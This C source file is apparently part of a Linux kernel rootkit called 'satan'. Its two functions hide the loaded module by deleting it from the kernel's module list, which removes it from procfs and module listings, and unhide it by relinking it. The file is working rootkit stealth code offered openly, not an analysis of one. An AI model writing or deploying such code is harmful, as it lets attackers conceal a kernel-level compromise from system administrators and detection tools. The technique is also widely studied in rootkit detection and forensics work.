// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "module.h"

#include <linux/list.h>
#include <linux/module.h>

static bool is_hidden = false;
static struct list_head *module_prev = NULL;


/**
 * satan_module_hide() - Hides satan rootkit.
 */
void satan_module_hide(void)
{
        if (is_hidden)
                return;

        module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
        list_del(&THIS_MODULE->list);  // removes from procfs

        is_hidden = true;
}

/**
 * satan_module_unhide() - Unhides satan rootkit.
 */
void satan_module_unhide(void)
{
        if (!is_hidden)
                return;

        list_add(&THIS_MODULE->list, module_prev);
        module_prev = NULL;

        is_hidden = false;
}
